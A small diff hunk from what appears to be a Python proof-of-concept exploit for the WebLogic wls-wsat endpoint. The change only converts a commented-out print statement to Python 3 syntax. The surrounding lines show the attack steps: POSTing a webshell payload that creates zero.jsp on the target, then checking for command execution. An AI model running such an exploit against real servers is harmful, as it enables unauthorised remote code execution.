@@ -46,7 +46,7 @@ def poc(url):
     try:
         # Step 1: POST webshell to target, if remote system is vulnerable, it will create a zero.jsp on remote machine
         url1 = 'http://' + url + '/wls-wsat/CoordinatorPortType11'
-        # print url1
+        # print( url1)
         resp = requests.post(url1, data=payload, headers=headers, timeout=5)  # attack
 
         # Step 2 : Check whether can execute command on target
